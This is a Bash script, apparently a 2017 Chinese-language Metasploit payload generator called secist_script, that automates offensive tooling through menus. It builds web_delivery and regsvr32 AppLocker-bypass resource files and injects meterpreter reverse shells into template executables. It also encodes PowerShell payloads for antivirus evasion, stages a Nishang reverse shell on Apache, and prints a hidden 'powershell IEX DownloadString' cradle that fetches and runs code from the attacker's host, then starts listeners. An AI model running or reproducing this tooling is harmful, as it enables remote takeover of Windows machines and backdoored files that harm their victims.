 #!/bin/bash
  clear
  echo "   ____ _               _    _                   "
  echo "  / ___| |__   ___  ___| | _(_)_ __   __ _             "
  echo " | |   | '_ \ / _ \/ __| |/ / | '_ \ / _\ |            "
  echo " | |___| | | |  __/ (__|   <| | | | | (_| |  _   _   _ "
  echo "  \____|_| |_|\___|\___|_|\_\_|_| |_|\__/ | (_) (_) (_)"
  echo "                                     	|___/    "
  echo -e '-- -- +=[(c) 2017 | www.ggsec.cn | www.secist.com | Demon '

  echo -e "/==========================########========================\\"
  echo -e "|                             # v1.5                       |"
  echo -e "|                         版本改进更新1.5                  |"
  echo -e "|                        #检查脚本中请稍等.........        |"
  echo -e "|———————————#—————————————————#——————————————————#—————————|"
  echo -e "|                                            Demon 2017    |"
  echo -e "\==========================================================/"
  echo "   "
  sleep 1
  echo "   "
  #banner 信息输出 检测程序
  # check msfconsole
  which msfconsole > /dev/null 2>&1
  if [ "$?" -eq "0" ]; then
  msfconsole='1'
  else
  msfconsole='0'
  fi
  # check msfvenom
  which msfvenom > /dev/null 2>&1
  if [ "$?" -eq "0" ]; then
  msfvenom='1'
  else
  msfvenom='0'
  fi
  echo -n Check script  = =;
  sleep 1 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done
  if [ "$msfconsole" == "1" ] && [ "$msfvenom" == "1" ]   ;then
  echo -e " 【已找到】"
  echo ""
  echo ""
  echo -e 'msfconsole    【已找到】'
  echo -e 'msfvenom      【已找到】'
  echo ""
  sleep 2
  fi
  if [ "$msfconsole" == "0" ] || [ "$msfvenom" == "0" ]; then
  fail='1'
  echo -en "\b \e[0;31m【Fail】\e[0m"
  echo ""
  echo ""
  fi
  if [ "$msfconsole" == "0" ] ;then
  echo -e 'msfconsole    \e[0;31m【!!】 Not Found, first must be installed metasploit\e[0m';
  fi
  if [ "$msfvenom" == "0" ] ;then
  echo -e 'msfvenom      \e[0;31m【!!】 Not Found, first must be install metasploit\e[0m';
  fi
  #判断 metasploit是否已安装
  rm -rf resource
  rm -rf output
  mkdir resource
  mkdir output
  #清除缓存目录，并创建resource目录，放rc文件
  menu()
  {
  clear
  echo "              _     _                     _       _"
  echo "___  ___  ___(_)___| |_     ___  ___ _ __(_)_ __ | |_"
  echo "/ __|/ _ \/ __| / __| __|   / __|/ __| '__| | '_ \| __|"
  echo "\__ \  __/ (__| \__ \ |_    \__ \ (__| |  | | |_) | |_ "
  echo "|___/\___|\___|_|___/\__|___|___/\___|_|  |_| .__/ \__|"
  echo "        |_____|              |_|                      "
  echo "   "
  echo "                                                 v  1.5 "

  echo -e "/==========================########========================\\"
  echo -e "|               #我的博客www.ggsec.cn#                     |"
  echo -e "|               #Metasploit Payload Generator#             |"
  echo -e "|               #我的第一个自动化简单小脚本#               |"
  echo -e "|               ##即刻安全博客 www.secist.com              |"
  echo -e "|———————————#—————————————————#——————————————————#—————————|"
  echo -e "|                                            Demon 2017    |"
  echo -e "\==========================================================/"
  echo "   "
  sleep 1
  echo "   "
  echo  "################################################################## "
  echo  "#   [1]  web_delivery(php)	       [2]  web_delivery(python) #"
  echo  "#   [3]  web_delivery(powershell)      [4]  文件注入Payload      #"
  echo  "#   [5]  bypass_server(powershell)     [6]  ps1encode            #"
  echo  "#   [7]  Avoidz Metasploit PAYLOAD     [8]  nishang_PAYLOAD (NC) #"
  echo  "#   [9]  About Me                      [10]  exit                #"
  echo  "################################################################## "
  echo ""
  echo -e "         secist> \c"
  read number
  case $number in
    1)
    echo -e "       secist>请输入你的ip地址: \c"
    read ip
    echo -e "       secist>请输入你的端口: \c"
    read port
    echo  "################################################################## "
    echo "use exploit/multi/script/web_delivery" >> resource/php.rc
    echo "set PAYLOAD php/meterpreter/reverse_tcp" >> resource/php.rc
    echo "set TARGET 1" >> resource/php.rc
    echo "set LHOST $ip" >> resource/php.rc
    echo "set LPORT $port" >> resource/php.rc
    echo "set URIPATH /" >> resource/php.rc
    echo "run" >> resource/php.rc
    msfconsole -r resource/php.rc
        ;;
    2)
    echo -e "       secist>请输入你的ip地址: \c"
    read ip
    echo -e "        secist>请输入你的端口: \c"
    read port
    echo  "################################################################## "
    echo "use exploit/multi/script/web_delivery" >> resource/python.rc
    echo "set LHOST $ip" >> resource/python.rc
    echo "set LPORT $port" >> resource/python.rc
    echo "set URIPATH /" >> resource/python.rc
    echo "run" >>resource/python.rc
    msfconsole -r resource/python.rc
        ;;
    3)
    echo -e "        secist>请输入你的ip地址: \c"
    read ip
    echo -e "        secist>请输入你的端口: \c"
    read port
    echo  "################################################################## "
    echo "use exploit/multi/script/web_delivery" >> resource/powershell.rc
    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/powershell.rc
    echo "set TARGET 2" >> resource/powershell.rc
    echo "set LHOST $ip" >> resource/powershell.rc
    echo "set LPORT $port" >> resource/powershell.rc
    echo "set URIPATH /" >> resource/powershell.rc
    echo "run" >> resource/powershell.rc
    msfconsole -r resource/powershell.rc
    ;;
    4)
    echo -e "         secist>请输入你的ip地址: \c"
    read ip
    echo -e "         secist>请输入你的端口: \c"
    read port
    echo -e "         secist>请放入模板文件到当前目录，并输入你放入的文件名称: \c"
    read file
    echo -e "         secist>请输入你的保存的文件名称: \c"
    read output
    echo " 请稍等几分钟，您的烤鱼即将出炉=====================================》"
    echo  "################################################################## "
    echo ""
    sleep 2
    meun2
    msfvenom -a x86 --platform windows -x $file.exe -k -p windows/meterpreter/reverse_tcp  LHOST=$ip LPORT=$port –b “\ x00”  -f exe  >$output.exe
    sleep 1
    echo -e "Do you start the payload handler? y or n: \c"
    read handler
    if [ "$handler" == "y" ]; then
    echo "use exploit/multi/handler" >> resource/handler.rc
    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/handler.rc
    echo "set LHOST $ip" >>  resource/handler.rc
    echo "set LPORT $port" >>  resource/handler.rc
    echo "exploit " >>  resource/handler.rc
    msfconsole -r  resource/handler.rc
    fi
    ;;
    5)
    echo -e "       secist>请输入你的ip地址: \c"
    read ip
    echo -e "       secist>请输入你的端口: \c"
    read port
    echo  "################################################################## "
    echo "use exploit/windows/misc/regsvr32_applocker_bypass_server" >> resource/bypass.rc
    echo "set LHOST $ip" >> resource/bypass.rc
    echo "set LPORT $port" >> resource/bypass.rc
    echo "set URIPATH /" >> resource/bypass.rc
    echo "run" >> resource/bypass.rc
    msfconsole -r resource/bypass.rc
    ;;
    6)
      ps1encode
        ;;
    7)
     avoidz
       ;;
    8)
    echo -e "       secist>请输入你的ip地址: \c"
    read ip
    echo -e "        secist>请输入你的端口: \c"
    read port
    #输入IP和端口
    cp Invoke-PowerShellTcp.ps1 output/Invoke-PowerShellTcp.ps1
    #将PowerShell脚本复制出来到output中
    echo Invoke-PowerShellTcp -Reverse -IPAddress $ip -Port $port >> output/Invoke-PowerShellTcp.ps1
    #将PAYLOAD 写入脚本中
    cp output/Invoke-PowerShellTcp.ps1 /var/www/html
    service apache2 start
    #以及将我们的脚本复制到apche目录中，并开启web端口
    echo  "####################################################################################################################################  "
    echo " "
    echo "[*]powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://$ip/Invoke-PowerShellTcp.ps1');"
    echo " "
    echo  "####################################################################################################################################  "
    #echo输出我们的powershell 下载地址执行,我的docker 中的web80端口对应的是本机的8081 所以我这里需要手动添加下，你们平常在kali下是不用添加，也可以自行修改
    nc -vv -l -p $port
    #以及开启我们的nc监听
    ;;
    9)
      menu1
      ;;
    10)
    exit
    ;;
    *)
        menu
        ;;
    esac

}
#以上为主菜单功能，输入6返回二级菜单栏目，输入其他选项，再次进入主菜单。
ps1encode (){
clear

echo  -e "         < Powershell Payload >"
echo  -e "          --------------------"
echo -e "                             \   ^__^             "
echo -e "                              \  (oo)\_______     "
echo -e "                                 (__)\       )\/\ "
echo -e "                                     ||----w |    "
echo -e "                                     ||     ||     "
echo "  "

echo "        [1] Meterpreter_Reverse_tcp		 [5] Shell_reverse_tcp"
echo "        [2] Meterpreter_Reverse_http		 [6] Powershell_reverse_tcp"
echo "        [3] Meterpreter_Reverse_https		 [7] Multi encode payload"
echo "        [4] Meterpreter_Reverse_tcp_dns          [8]cmd/windows/reverse_powershell  "
echo "        [9] exit                                 [10] back meun     "
echo ""
echo -e "              secist> \c"
read option

#Aukeratu
case $option in
1)
payload='windows/meterpreter/reverse_tcp'
;;
2)
payload='windows/meterpreter/reverse_http'
;;
3)
payload='windows/meterpreter/reverse_https'
;;
4)
payload='windows/meterpreter/reverse_tcp_dns'
;;
5)
payload='windows/shell/reverse_tcp'
;;
6)
payload='windows/powershell_reverse_tcp'
;;
7)
payload='windows/meterpreter/reverse_tcp'
;;
8)
payload='cmd/windows/reverse_powershell'
;;
9)
exit
;;
10)
meun
;;
*)
ps1encode
;;
esac
if [ "$option" == "1" ]; then
  code

elif [ "$option" == "2" ]; then
  code

elif [ "$option" == "3" ]; then
   code

elif [ "$option" == "4" ]; then
  code

elif [ "$option" == "5" ]; then
  code

elif [ "$option" == "6" ]; then
    code

elif [ "$option" == "7" ]; then
  code
elif [ "$option" == "8" ]; then
  echo -e "       secist>请输入你的ip地址: \c"
  read ip
  echo -e "       secist>请输入你的端口: \c"
  read port
  echo -e  "        secist>请输入你要保存的文件名：\c "
  read output
   msfvenom -p $payload LHOST=$ip LPORT=$port -o output/$output.bat
   echo " 请稍等几分钟，您的烤鱼即将出炉=====================================》"
   echo  "################################################################## "
   clear
   echo -e "  +------------++-------------------------++-----------------------+"
   echo -e "  | Name       ||  Descript   	          || Your Input             "
   echo -e "  +------------++-------------------------++-----------------------+"
   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
   echo -e "  | OUTPUTNAME ||  The Filename output    || output/$output.bat     "
   echo -e "  +------------++-------------------------++-----------------------+"
   echo "use exploit/multi/handler" >> resource/handler.rc
   echo "set PAYLOAD $payload" >> resource/handler.rc
   echo "set LHOST $ip" >>  resource/handler.rc
   echo "set LPORT $port" >>  resource/handler.rc
   echo "exploit " >>  resource/handler.rc
   msfconsole -r  resource/handler.rc
fi
}
menu1()
{
clear
echo -e "_______________________________________________________________________"
echo -e "    我是即刻安全团队的 Demon，平时较活跃于漏洞银行、ichunqiu、等平台。 主要擅长web安全、黑苹果及Kali的渗透测试等。目前专注于metaspolit的研究学习，希望借助本套教程 分享一些我的学习思路和经验。"
echo -e "    对课程内容有任何疑问，都可通过以下渠道与我们取得联系:  "
echo -e "                     < My Blog: www.ggsec.cn >"
echo -e "                    < My Team Blog: www.secist.com>"
echo "                          即刻官方QQ 群：532925486 "
echo "                           欢迎使用我的脚本 v1.5"
echo "                         Ps:更改代码请注明原作者                             "
echo -e "---------------------------------------------------------------------- "
echo -e "                             \   ^__^             "
echo -e "                              \  (oo)\_______     "
echo -e "                                 (__)\       )\/\ "
echo -e "                                     ||----w |    "
echo -e "                                     ||     ||     "
echo "  "
echo  "################################################################## "
echo  "#                           [1]back meun                          #"
echo  "#                           [2]exit                               #"
echo  "################################################################## "
echo "  "
echo -e "                         secist> \c"
read number
case $number in
#二级菜单功能
    1)
        menu
        ;;
    2)
    exit
    ;;
    *)
      menu1
        ;;
    esac

}

code(){
#定义了一个菜单为code
  echo -e "       secist>请输入你的ip地址: \c"
  read ip
  echo -e "       secist>请输入你的端口: \c"
  read port
./ps1encode.rb -i $ip -p $port -a $payload -t cmd
#对shellcode 输出
echo ""
echo -e "Do you outputfile (ps1)? y or n: \c"
read ps1
if [ "$ps1" == "y" ]; then
echo -e  "        secist>请输入你要保存的文件名：\c "
read output
#选择y 并保存文件
echo " 请稍等几分钟，您的烤鱼即将出炉=====================================》"
echo  "################################################################## "
echo $(./ps1encode.rb -i $ip -p $port -a windows/meterpreter/reverse_tcp -t cmd) >>output/$output.ps1
cp output/$output.ps1 /var/www/html
service apache2 start
echo  "################################################################## "
#将输出后的代码保存到output文件夹当中，保存自定义后的脚本
clear
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | Name       ||  Descript   	          || Your Input              "
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
echo -e "  | OUTPUTNAME ||  The Filename output    || output/$output.ps1     "
echo -e "  +------------++-------------------------++-----------------------+"
echo  "####################################################################################################################################  "
echo " "
echo "[*]powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://$ip/$output.ps1');"
echo " "
echo  "####################################################################################################################################  "
echo "use exploit/multi/handler" >> resource/handler.rc
echo "set PAYLOAD $payload" >> resource/handler.rc
echo "set LHOST $ip" >>  resource/handler.rc
echo "set LPORT $port" >>  resource/handler.rc
echo "exploit " >>  resource/handler.rc
msfconsole -r  resource/handler.rc
#选择y ——》将输出的内容保存自定义的文件，并执行msf监听模块
elif [ "$ps1" == "n" ]; then
echo "use exploit/multi/handler" >> resource/handler.rc
echo "set PAYLOAD $payload" >> resource/handler.rc
echo "set LHOST $ip" >>  resource/handler.rc
echo "set LPORT $port" >>  resource/handler.rc
echo "exploit " >>  resource/handler.rc
msfconsole -r  resource/handler.rc
fi
#否则，（选择N后）直接执行msf监听模块
}



avoidz (){
clear

echo  -e "         < avoidz Payload >"
echo  -e "          --------------------"
echo -e "                             \   ^__^             "
echo -e "                              \  (oo)\_______     "
echo -e "                                 (__)\       )\/\ "
echo -e "                                     ||----w |    "
echo -e "                                     ||     ||     "
echo "  "

echo "        [1] Meterpreter_Reverse_tcp		 [5] Shell_reverse_tcp"
echo "        [2] Meterpreter_Reverse_http		 [6] Powershell_reverse_tcp"
echo "        [3] Meterpreter_Reverse_https		 [7] Multi encode payload"
echo "        [4] Meterpreter_Reverse_tcp_dns          [8] exit        "
echo "        [9] back meun     "
echo ""
echo -e "              secist> \c"
read option

#Aukeratu
case $option in
1)
payload='windows/meterpreter/reverse_tcp'
;;
2)
payload='windows/meterpreter/reverse_http'
;;
3)
payload='windows/meterpreter/reverse_https'
;;
4)
payload='windows/meterpreter/reverse_tcp_dns'
;;
5)
payload='windows/shell/reverse_tcp'
;;
6)
payload='windows/powershell_reverse_tcp'
;;
7)
payload='windows/meterpreter/reverse_tcp'
;;
8)
exit
;;
9)
menu
;;
*)
avoidz
;;
esac
if [ "$option" == "1" ]; then
  code1

elif [ "$option" == "2" ]; then
  code1

elif [ "$option" == "3" ]; then
   code1

elif [ "$option" == "4" ]; then
  code1

elif [ "$option" == "5" ]; then
  code1

elif [ "$option" == "6" ]; then
    code1

elif [ "$option" == "7" ]; then
  code1
fi
}
code1(){
  rm /root/temp1.exe
  echo -e "       secist>请输入你的ip地址: \c"
  read ip
  echo -e "       secist>请输入你的端口: \c"
  read port
  echo " 请稍等几分钟，您的烤鱼即将出炉=====================================》"
  echo  "################################################################## "
  ruby avoidz.rb -h $ip -p $port -m $payload -f temp1
  echo  "################################################################## "
  clear
  echo -e "  +------------++-------------------------++-----------------------+"
  echo -e "  | Name       ||  Descript   	          || Your Input              "
  echo -e "  +------------++-------------------------++-----------------------+"
  echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
  echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
  echo -e "  | OUTPUTNAME ||  The Filename output    || /root/temp1.exe      "
  echo -e "  +------------++-------------------------++-----------------------+"
  echo "use exploit/multi/handler" >> resource/handler.rc
  echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/handler.rc
  echo "set LHOST $ip" >>  resource/handler.rc
  echo "set LPORT $port" >>  resource/handler.rc
  echo "exploit " >>  resource/handler.rc
  msfconsole -r  resource/handler.rc
}

meun2 (){
  clear
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | Name       ||  Descript   	          || Your Input              "
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
echo -e "  | OUTPUTNAME ||  The Filename output    || $output.exe            "
echo -e "  +------------++-------------------------++-----------------------+"
}
#定义三级菜单，输出输入的详细信息
menu
#定义菜单栏menu 为主菜单
